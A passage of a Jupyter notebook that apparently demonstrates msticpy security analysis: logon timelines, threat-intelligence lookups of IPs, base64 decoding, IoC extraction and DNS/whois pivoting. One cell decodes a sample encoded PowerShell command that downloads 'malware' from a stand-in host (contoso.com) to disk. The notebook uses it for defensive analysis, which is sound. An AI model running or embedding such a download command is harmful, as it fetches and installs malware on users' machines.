table-cell;\">styles&nbsp;=&nbsp;{},</div></div><div class=\"p3353\" style=\"display: none;\"><div style=\"display: table-cell;\"></div><div style=\"display: table-cell;\">stylesheets&nbsp;=&nbsp;[],</div></div><div class=\"p3353\" style=\"display: none;\"><div style=\"display: table-cell;\"></div><div style=\"display: table-cell;\">subscribed_events&nbsp;=&nbsp;PropertyValueSet(),</div></div><div class=\"p3353\" style=\"display: none;\"><div style=\"display: table-cell;\"></div><div style=\"display: table-cell;\">syncable&nbsp;=&nbsp;True,</div></div><div class=\"p3353\" style=\"display: none;\"><div style=\"display: table-cell;\"></div><div style=\"display: table-cell;\">tags&nbsp;=&nbsp;[],</div></div><div class=\"p3353\" style=\"display: none;\"><div style=\"display: table-cell;\"></div><div style=\"display: table-cell;\">visible&nbsp;=&nbsp;True,</div></div><div class=\"p3353\" style=\"display: none;\"><div style=\"display: table-cell;\"></div><div style=\"display: table-cell;\">width&nbsp;=&nbsp;None,</div></div><div class=\"p3353\" style=\"display: none;\"><div style=\"display: table-cell;\"></div><div style=\"display: table-cell;\">width_policy&nbsp;=&nbsp;'auto')</div></div></div>\n",
       "<script>\n",
       "(function() {\n",
       "  let expanded = false;\n",
       "  const ellipsis = document.getElementById(\"p3354\");\n",
       "  ellipsis.addEventListener(\"click\", function() {\n",
       "    const rows = document.getElementsByClassName(\"p3353\");\n",
       "    for (let i = 0; i < rows.length; i++) {\n",
       "      const el = rows[i];\n",
       "      el.style.display = expanded ? \"none\" : \"table-row\";\n",
       "    }\n",
       "    ellipsis.innerHTML = expanded ? \"&hellip;)\" : \"&lsaquo;&lsaquo;&lsaquo;\";\n",
       "    expanded = !expanded;\n",
       "  });\n",
       "})();\n",
       "</script>\n"
      ],
      "text/plain": [
       "Column(id='p3334', ...)"
      ]
     },
     "execution_count": 38,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "logons_df.mp_plot.timeline(\n",
    "    group_by = \"IPAddress\",\n",
    "    source_columns = [\"AppDisplayName\"],\n",
    ")"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "1c6e932e",
   "metadata": {},
   "source": [
    "## Part 3 - Enriching data"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 48,
   "id": "ecac08ba",
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/markdown": [
       "IP address to lookup is 24.16.133.227"
      ],
      "text/plain": [
       "<IPython.core.display.Markdown object>"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "520db896d9fd43519009c972736018af",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "Observables processed:   0%|          | 0/2 [00:00<?, ?obs/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "data": {
      "text/html": [
       "<div>\n",
       "<style scoped>\n",
       "    .dataframe tbody tr th:only-of-type {\n",
       "        vertical-align: middle;\n",
       "    }\n",
       "\n",
       "    .dataframe tbody tr th {\n",
       "        vertical-align: top;\n",
       "    }\n",
       "\n",
       "    .dataframe thead th {\n",
       "        text-align: right;\n",
       "    }\n",
       "</style>\n",
       "<table border=\"1\" class=\"dataframe\">\n",
       "  <thead>\n",
       "    <tr style=\"text-align: right;\">\n",
       "      <th></th>\n",
       "      <th>QuerySubtype</th>\n",
       "      <th>Result</th>\n",
       "      <th>Details</th>\n",
       "      <th>RawResult</th>\n",
       "      <th>Reference</th>\n",
       "      <th>Status</th>\n",
       "      <th>Ioc</th>\n",
       "      <th>IocType</th>\n",
       "      <th>SafeIoc</th>\n",
       "      <th>Severity</th>\n",
       "      <th>Provider</th>\n",
       "    </tr>\n",
       "  </thead>\n",
       "  <tbody>\n",
       "  </tbody>\n",
       "</table>\n",
       "</div>"
      ],
      "text/plain": [
       "Empty DataFrame\n",
       "Columns: [QuerySubtype, Result, Details, RawResult, Reference, Status, Ioc, IocType, SafeIoc, Severity, Provider]\n",
       "Index: []"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    }
   ],
   "source": [
    "from msticpy.context.tilookup import TILookup\n",
    "\n",
    "ti = TILookup()\n",
    "\n",
    "ip = logons_df.iloc[1]['IPAddress']\n",
    "md(f\"IP address to lookup is {ip}\")\n",
    "\n",
    "ti_resp = ti.lookup_ioc(ip, providers=[\"VirusTotal\", \"OTX\"], ioc_type=\"ip\")\n",
    "\n",
    "ti_resp = ti.result_to_df(ti_resp)\n",
    "display(ti_resp)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 52,
   "id": "0e904d83",
   "metadata": {},
   "outputs": [
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "f74bf223b99049dfaee7bb96bf334aa6",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "Observables processed:   0%|          | 0/10 [00:00<?, ?obs/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "469d577d57b84baaa5a26640e45b19ec",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "VBox(children=(Text(value=\"136.55.145.135                           type: ipv4        (sev: information)  prov…"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "data": {
      "text/html": [
       "<hr>"
      ],
      "text/plain": [
       "<IPython.core.display.HTML object>"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "data": {
      "text/html": [
       "<h2 style='border: 1px solid;background-color: DarkGray; padding: 6px'>73.35.204.105</h2><h3 style='background-color: SteelBlue; padding: 6px'>Type: 'ipv4', Provider: VirusTotal, severity: information</h3><h4>Details</h4>\n",
       "<style>\n",
       "    .tb_ti_res {border-collapse: collapse; width: 60%; border: 1px solid #ddd !important;}\n",
       "    .cell_ti {border: 1px solid #ddd !important;\n",
       "        text-align: left !important; padding: 5px !important; height: 12px}\n",
       "    .cell_ti_first {border: 1px solid #ddd !important; width: 25%;\n",
       "        text-align: left !important; padding: 5px !important; height: 12px}\n",
       "</style>\n",
       "<table class='tb_ti_res'><tr class='cell_ti'><td class='cell_ti_first'>VirusTotal</td><tr class='cell_ti'><td class='cell_ti_first'>verbose_msg</td><td class='cell_ti'>IP address in dataset</td></tr><tr class='cell_ti'><td class='cell_ti_first'>response_code</td><td class='cell_ti'>1</td></tr><tr class='cell_ti'><td class='cell_ti_first'>positives</td><td class='cell_ti'>0</td></tr><tr class='cell_ti'><td class='cell_ti_first'>detected_urls</td><td class='cell_ti'>[]</td></tr></tr></table><h4>Reference: </h4><a href='https://www.virustotal.com/vtapi/v2/ip-address/report'>https://www.virustotal.com/vtapi/v2/ip-address/report</a><br><hr><h4>Raw Results</h4>\n",
       "        <details>\n",
       "        <summary> <u>Raw results from provider...</u></summary>\n",
       "        <pre  style=\"font-size:11px\">{'as_owner':&nbsp;'COMCAST-7922',<br>&nbsp;'asn':&nbsp;7922,<br>&nbsp;'country':&nbsp;'US',<br>&nbsp;'detected_urls':&nbsp;[],<br>&nbsp;'resolutions':&nbsp;[],<br>&nbsp;'response_code':&nbsp;1,<br>&nbsp;'verbose_msg':&nbsp;'IP&nbsp;address&nbsp;in&nbsp;dataset'}</pre>\n",
       "        </details>\n",
       "        <h3 style='background-color: SteelBlue; padding: 6px'>Type: 'ipv4', Provider: OTX, severity: information</h3><h4>Details</h4>\n",
       "<style>\n",
       "    .tb_ti_res {border-collapse: collapse; width: 60%; border: 1px solid #ddd !important;}\n",
       "    .cell_ti {border: 1px solid #ddd !important;\n",
       "        text-align: left !important; padding: 5px !important; height: 12px}\n",
       "    .cell_ti_first {border: 1px solid #ddd !important; width: 25%;\n",
       "        text-align: left !important; padding: 5px !important; height: 12px}\n",
       "</style>\n",
       "<table class='tb_ti_res'><tr class='cell_ti'><td class='cell_ti_first'>OTX</td><tr class='cell_ti'><td class='cell_ti_first'>pulse_count</td><td class='cell_ti'>0</td></tr><tr class='cell_ti'><td class='cell_ti_first'>sections_available</td><td class='cell_ti'>['general', 'geo', 'reputation', 'url_list', 'passive_dns', 'malware', 'nids_list', 'http_scans']</td></tr></tr></table><h4>Reference: </h4><a href='https://otx.alienvault.com/api/v1/indicators/IPv4/73.35.204.105/general'>https://otx.alienvault.com/api/v1/indicators/IPv4/73.35.204.105/general</a><br><hr><h4>Raw Results</h4>\n",
       "        <details>\n",
       "        <summary> <u>Raw results from provider...</u></summary>\n",
       "        <pre  style=\"font-size:11px\">{'accuracy_radius':&nbsp;20,<br>&nbsp;'area_code':&nbsp;0,<br>&nbsp;'asn':&nbsp;'AS7922&nbsp;comcast',<br>&nbsp;'base_indicator':&nbsp;{},<br>&nbsp;'charset':&nbsp;0,<br>&nbsp;'city':&nbsp;'Oak&nbsp;Harbor',<br>&nbsp;'city_data':&nbsp;True,<br>&nbsp;'continent_code':&nbsp;'NA',<br>&nbsp;'country_code':&nbsp;'US',<br>&nbsp;'country_code2':&nbsp;'US',<br>&nbsp;'country_code3':&nbsp;'USA',<br>&nbsp;'country_name':&nbsp;'United&nbsp;States&nbsp;of&nbsp;America',<br>&nbsp;'dma_code':&nbsp;819,<br>&nbsp;'false_positive':&nbsp;[],<br>&nbsp;'flag_title':&nbsp;'United&nbsp;States&nbsp;of&nbsp;America',<br>&nbsp;'flag_url':&nbsp;'/assets/images/flags/us.png',<br>&nbsp;'indicator':&nbsp;'73.35.204.105',<br>&nbsp;'latitude':&nbsp;48.3108,<br>&nbsp;'longitude':&nbsp;-122.6322,<br>&nbsp;'postal_code':&nbsp;'98277',<br>&nbsp;'pulse_info':&nbsp;{'count':&nbsp;0,<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;'pulses':&nbsp;[],<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;'references':&nbsp;[],<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;'related':&nbsp;{'alienvault':&nbsp;{'adversary':&nbsp;[],<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;'industries':&nbsp;[],<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;'malware_families':&nbsp;[]},<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;'other':&nbsp;{'adversary':&nbsp;[],<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;'industries':&nbsp;[],<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;'malware_families':&nbsp;[]}}},<br>&nbsp;'region':&nbsp;'WA',<br>&nbsp;'reputation':&nbsp;0,<br>&nbsp;'sections':&nbsp;['general',<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;'geo',<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;'reputation',<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;'url_list',<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;'passive_dns',<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;'malware',<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;'nids_list',<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;'http_scans'],<br>&nbsp;'subdivision':&nbsp;'WA',<br>&nbsp;'type':&nbsp;'IPv4',<br>&nbsp;'type_title':&nbsp;'IPv4',<br>&nbsp;'validation':&nbsp;[],<br>&nbsp;'whois':&nbsp;'http://whois.domaintools.com/73.35.204.105'}</pre>\n",
       "        </details>\n",
       "        "
      ],
      "text/plain": [
       "<IPython.core.display.HTML object>"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    }
   ],
   "source": [
    "ti_results = ti.lookup_iocs(logons_df[[\"IPAddress\"]].drop_duplicates().head(), \"IPAddress\", providers=[\"VirusTotal\", \"OTX\"])\n",
    "ti.browse_results(ti_results, severities=[\"information\", \"warning\", \"high\"])"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 56,
   "id": "04f758c9",
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/html": [
       "<div>\n",
       "<style scoped>\n",
       "    .dataframe tbody tr th:only-of-type {\n",
       "        vertical-align: middle;\n",
       "    }\n",
       "\n",
       "    .dataframe tbody tr th {\n",
       "        vertical-align: top;\n",
       "    }\n",
       "\n",
       "    .dataframe thead th {\n",
       "        text-align: right;\n",
       "    }\n",
       "</style>\n",
       "<table border=\"1\" class=\"dataframe\">\n",
       "  <thead>\n",
       "    <tr style=\"text-align: right;\">\n",
       "      <th></th>\n",
       "      <th>0</th>\n",
       "    </tr>\n",
       "  </thead>\n",
       "  <tbody>\n",
       "    <tr>\n",
       "      <th>reference</th>\n",
       "      <td>(, 1., 1)</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>original_string</th>\n",
       "      <td>SW52b2tlLVdlYlJlcXVlc3QgaHR0cHM6Ly9jb250b3NvLmNvbS9tYWx3YXJlIC1PdXRGaWxlIEM6XG1hbHdhcmUuZXhl</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>file_name</th>\n",
       "      <td>unknown</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>file_type</th>\n",
       "      <td>None</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>input_bytes</th>\n",
       "      <td>b'Invoke-WebRequest https://contoso.com/malware -OutFile C:\\\\malware.exe'</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>decoded_string</th>\n",
       "      <td>Invoke-WebRequest https://contoso.com/malware -OutFile C:\\malware.exe</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>encoding_type</th>\n",
       "      <td>utf-8</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>file_hashes</th>\n",
       "      <td>{'md5': '5845a06d7f52b1818a088e889df95c77', 'sha1': '1c31052c4aabb853777c1ce74943cafe27bb1d42', ...</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>md5</th>\n",
       "      <td>5845a06d7f52b1818a088e889df95c77</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>sha1</th>\n",
       "      <td>1c31052c4aabb853777c1ce74943cafe27bb1d42</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>sha256</th>\n",
       "      <td>7054dcebb2f74492c06f4ba89cac8e7e99b44e1a6029e0ad403aab9bb7503d8c</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>printable_bytes</th>\n",
       "      <td>49 6e 76 6f 6b 65 2d 57 65 62 52 65 71 75 65 73 74 20 68 74 74 70 73 3a 2f 2f 63 6f 6e 74 6f 73 ...</td>\n",
       "    </tr>\n",
       "  </tbody>\n",
       "</table>\n",
       "</div>"
      ],
      "text/plain": [
       "                                                                                                                   0\n",
       "reference                                                                                                  (, 1., 1)\n",
       "original_string         SW52b2tlLVdlYlJlcXVlc3QgaHR0cHM6Ly9jb250b3NvLmNvbS9tYWx3YXJlIC1PdXRGaWxlIEM6XG1hbHdhcmUuZXhl\n",
       "file_name                                                                                                    unknown\n",
       "file_type                                                                                                       None\n",
       "input_bytes                                b'Invoke-WebRequest https://contoso.com/malware -OutFile C:\\\\malware.exe'\n",
       "decoded_string                                 Invoke-WebRequest https://contoso.com/malware -OutFile C:\\malware.exe\n",
       "encoding_type                                                                                                  utf-8\n",
       "file_hashes      {'md5': '5845a06d7f52b1818a088e889df95c77', 'sha1': '1c31052c4aabb853777c1ce74943cafe27bb1d42', ...\n",
       "md5                                                                                 5845a06d7f52b1818a088e889df95c77\n",
       "sha1                                                                        1c31052c4aabb853777c1ce74943cafe27bb1d42\n",
       "sha256                                              7054dcebb2f74492c06f4ba89cac8e7e99b44e1a6029e0ad403aab9bb7503d8c\n",
       "printable_bytes  49 6e 76 6f 6b 65 2d 57 65 62 52 65 71 75 65 73 74 20 68 74 74 70 73 3a 2f 2f 63 6f 6e 74 6f 73 ..."
      ]
     },
     "execution_count": 56,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "from msticpy.transform import base64unpack as b64\n",
    "\n",
    "b64_cmd = \"powershell.exe -encodedCommand SW52b2tlLVdlYlJlcXVlc3QgaHR0cHM6Ly9jb250b3NvLmNvbS9tYWx3YXJlIC1PdXRGaWxlIEM6XG1hbHdhcmUuZXhl\"\n",
    "\n",
    "unpack_txt = b64.unpack(input_string=b64_cmd)\n",
    "\n",
    "unpack_txt[1].T"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 63,
   "id": "e681e911",
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "['http://us-cert.gov/ciscp',\n",
       " 'http://www.us-cert.gov/tlp.',\n",
       " 'http://cybox.mitre.org/XMLSchema/objects/Domain_Name/1.0/Domain_Name_Object.xsd',\n",
       " 'http://www.us-cert.gov/sites/default/files/STIX_Namespace/ciscp_vocab_v1.1.1.xsd',\n",
       " 'http://stix.mitre.org/XMLSchema/default_vocabularies/1.1.1/stix_default_vocabularies.xsd']"
      ]
     },
     "execution_count": 63,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "from msticpy.transform import IoCExtract\n",
    "import requests\n",
    "\n",
    "ioc_extractor = IoCExtract()\n",
    "\n",
    "data = requests.get(\"https://www.us-cert.gov/sites/default/files/publications/AA20-099A_WHITE.stix.xml\")\n",
    "\n",
    "iocs = ioc_extractor.extract(data.text, ioc_types=\"url\")['url']\n",
    "\n",
    "list(iocs)[:5]"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 64,
   "id": "44ab605c",
   "metadata": {},
   "outputs": [],
   "source": [
    "import warnings\n",
    "from msticpy.datamodel.entities import *\n",
    "\n",
    "with warnings.catch_warnings():\n",
    "    warnings.simplefilter(\"ignore\")\n",
    "    pivot = Pivot(namespace = globals())"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 65,
   "id": "5b0033cf",
   "metadata": {},
   "outputs": [
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "9d77a113a8c049959f26ef304b068390",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "VBox(children=(HBox(children=(VBox(children=(HTML(value='<b>Entities</b>'), Select(description='entity', layou…"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    }
   ],
   "source": [
    "pivot.browse()"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 68,
   "id": "c7f6abc5",
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/html": [
       "Dns resolution<br>"
      ],
      "text/plain": [
       "<IPython.core.display.HTML object>"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "data": {
      "text/html": [
       "<div>\n",
       "<style scoped>\n",
       "    .dataframe tbody tr th:only-of-type {\n",
       "        vertical-align: middle;\n",
       "    }\n",
       "\n",
       "    .dataframe tbody tr th {\n",
       "        vertical-align: top;\n",
       "    }\n",
       "\n",
       "    .dataframe thead th {\n",
       "        text-align: right;\n",
       "    }\n",
       "</style>\n",
       "<table border=\"1\" class=\"dataframe\">\n",
       "  <thead>\n",
       "    <tr style=\"text-align: right;\">\n",
       "      <th></th>\n",
       "      <th>qname</th>\n",
       "      <th>rdtype</th>\n",
       "      <th>rdclass</th>\n",
       "      <th>response</th>\n",
       "      <th>nameserver</th>\n",
       "      <th>port</th>\n",
       "      <th>canonical_name</th>\n",
       "      <th>expiration</th>\n",
       "      <th>rrset</th>\n",
       "    </tr>\n",
       "  </thead>\n",
       "  <tbody>\n",
       "    <tr>\n",
       "      <th>0</th>\n",
       "      <td>www.microsoft.com.</td>\n",
       "      <td>A</td>\n",
       "      <td>IN</td>\n",
       "      <td>id 13462\\nopcode QUERY\\nrcode NOERROR\\nflags QR RD RA\\n;QUESTION\\nwww.microsoft.com. IN A\\n;ANSW...</td>\n",
       "      <td>64.59.135.133</td>\n",
       "      <td>53</td>\n",
       "      <td>e13678.dscb.akamaiedge.net.</td>\n",
       "      <td>2025-08-16 02:53:50.320745+00:00</td>\n",
       "      <td>23.217.131.226</td>\n",
       "    </tr>\n",
       "  </tbody>\n",
       "</table>\n",
       "</div>"
      ],
      "text/plain": [
       "                qname rdtype rdclass  \\\n",
       "0  www.microsoft.com.      A      IN   \n",
       "\n",
       "                                                                                              response  \\\n",
       "0  id 13462\\nopcode QUERY\\nrcode NOERROR\\nflags QR RD RA\\n;QUESTION\\nwww.microsoft.com. IN A\\n;ANSW...   \n",
       "\n",
       "      nameserver  port               canonical_name  \\\n",
       "0  64.59.135.133    53  e13678.dscb.akamaiedge.net.   \n",
       "\n",
       "                        expiration           rrset  \n",
       "0 2025-08-16 02:53:50.320745+00:00  23.217.131.226  "
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "data": {
      "text/html": [
       "<br>Dns components<br>"
      ],
      "text/plain": [
       "<IPython.core.display.HTML object>"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "data": {
      "text/html": [
       "<div>\n",
       "<style scoped>\n",
       "    .dataframe tbody tr th:only-of-type {\n",
       "        vertical-align: middle;\n",
       "    }\n",
       "\n",
       "    .dataframe tbody tr th {\n",
       "        vertical-align: top;\n",
       "    }\n",
       "\n",
       "    .dataframe thead th {\n",
       "        text-align: right;\n",
       "    }\n",
       "</style>\n",
       "<table border=\"1\" class=\"dataframe\">\n",
       "  <thead>\n",
       "    <tr style=\"text-align: right;\">\n",
       "      <th></th>\n",
       "      <th>subdomain</th>\n",
       "      <th>domain</th>\n",
       "      <th>suffix</th>\n",
       "      <th>is_private</th>\n",
       "      <th>registry_suffix</th>\n",
       "      <th>src_row_index</th>\n",
       "    </tr>\n",
       "  </thead>\n",
       "  <tbody>\n",
       "    <tr>\n",
       "      <th>0</th>\n",
       "      <td>www</td>\n",
       "      <td>www.microsoft.com</td>\n",
       "      <td>com</td>\n",
       "      <td>False</td>\n",
       "      <td>com</td>\n",
       "      <td>0</td>\n",
       "    </tr>\n",
       "  </tbody>\n",
       "</table>\n",
       "</div>"
      ],
      "text/plain": [
       "  subdomain             domain suffix is_private registry_suffix  \\\n",
       "0       www  www.microsoft.com    com      False             com   \n",
       "\n",
       "   src_row_index  \n",
       "0              0  "
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "data": {
      "text/html": [
       "<br>IP address type<br>"
      ],
      "text/plain": [
       "<IPython.core.display.HTML object>"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "data": {
      "text/html": [
       "<div>\n",
       "<style scoped>\n",
       "    .dataframe tbody tr th:only-of-type {\n",
       "        vertical-align: middle;\n",
       "    }\n",
       "\n",
       "    .dataframe tbody tr th {\n",
       "        vertical-align: top;\n",
       "    }\n",
       "\n",
       "    .dataframe thead th {\n",
       "        text-align: right;\n",
       "    }\n",
       "</style>\n",
       "<table border=\"1\" class=\"dataframe\">\n",
       "  <thead>\n",
       "    <tr style=\"text-align: right;\">\n",
       "      <th></th>\n",
       "      <th>ip</th>\n",
       "      <th>result</th>\n",
       "      <th>src_row_index</th>\n",
       "    </tr>\n",
       "  </thead>\n",
       "  <tbody>\n",
       "    <tr>\n",
       "      <th>0</th>\n",
       "      <td>24.16.133.227</td>\n",
       "      <td>Public</td>\n",
       "      <td>0</td>\n",
       "    </tr>\n",
       "  </tbody>\n",
       "</table>\n",
       "</div>"
      ],
      "text/plain": [
       "              ip  result  src_row_index\n",
       "0  24.16.133.227  Public              0"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "data": {
      "text/html": [
       "<br>IP address ownership<br>"
      ],
      "text/plain": [
       "<IPython.core.display.HTML object>"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "data": {
      "text/html": [
       "<div>\n",
       "<style scoped>\n",
       "    .dataframe tbody tr th:only-of-type {\n",
       "        vertical-align: middle;\n",
       "    }\n",
       "\n",
       "    .dataframe tbody tr th {\n",
       "        vertical-align: top;\n",
       "    }\n",
       "\n",
       "    .dataframe thead th {\n",
       "        text-align: right;\n",
       "    }\n",
       "</style>\n",
       "<table border=\"1\" class=\"dataframe\">\n",
       "  <thead>\n",
       "    <tr style=\"text-align: right;\">\n",
       "      <th></th>\n",
       "      <th>ip_column</th>\n",
       "      <th>asn</th>\n",
       "      <th>query</th>\n",
       "      <th>asn_cidr</th>\n",
       "      <th>asn_country_code</th>\n",
       "      <th>asn_registry</th>\n",
       "      <th>asn_date</th>\n",
       "      <th>asn_description</th>\n",
       "      <th>nets</th>\n",
       "      <th>WhoIsData</th>\n",
       "      <th>AsnDescription</th>\n",
       "    </tr>\n",
       "  </thead>\n",
       "  <tbody>\n",
       "    <tr>\n",
       "      <th>0</th>\n",
       "      <td>24.16.133.227</td>\n",
       "      <td>7922</td>\n",
       "      <td>24.16.133.227</td>\n",
       "      <td>24.16.0.0/13</td>\n",
       "      <td>US</td>\n",
       "      <td>arin</td>\n",
       "      <td>2003-10-06</td>\n",
       "      <td>COMCAST-7922, US</td>\n",
       "      <td>[{'cidr': '24.16.0.0/14', 'handle': 'NET-24-16-0-0-2', 'name': 'WASHINGTON-9', 'startAddress': '...</td>\n",
       "      <td>{'asn': '7922', 'query': '24.16.133.227', 'asn_cidr': '24.16.0.0/13', 'asn_country_code': 'US', ...</td>\n",
       "      <td>COMCAST-7922, US</td>\n",
       "    </tr>\n",
       "  </tbody>\n",
       "</table>\n",
       "</div>"
      ],
      "text/plain": [
       "       ip_column   asn          query      asn_cidr asn_country_code  \\\n",
       "0  24.16.133.227  7922  24.16.133.227  24.16.0.0/13               US   \n",
       "\n",
       "  asn_registry    asn_date   asn_description  \\\n",
       "0         arin  2003-10-06  COMCAST-7922, US   \n",
       "\n",
       "                                                                                                  nets  \\\n",
       "0  [{'cidr': '24.16.0.0/14', 'handle': 'NET-24-16-0-0-2', 'name': 'WASHINGTON-9', 'startAddress': '...   \n",
       "\n",
       "                                                                                             WhoIsData  \\\n",
       "0  {'asn': '7922', 'query': '24.16.133.227', 'asn_cidr': '24.16.0.0/13', 'asn_country_code': 'US', ...   \n",
       "\n",
       "     AsnDescription  \n",
       "0  COMCAST-7922, US  "
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "data": {
      "text/html": [
       "<br>IP address location<br>"
      ],
      "text/plain": [
       "<IPython.core.display.HTML object>"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "data": {
      "text/html": [
       "<div>\n",
       "<style scoped>\n",
       "    .dataframe tbody tr th:only-of-type {\n",
       "        vertical-align: middle;\n",
       "    }\n",
       "\n",
       "    .dataframe tbody tr th {\n",
       "        vertical-align: top;\n",
       "    }\n",
       "\n",
       "    .dataframe thead th {\n",
       "        text-align: right;\n",
       "    }\n",
       "</style>\n",
       "<table border=\"1\" class=\"dataframe\">\n",
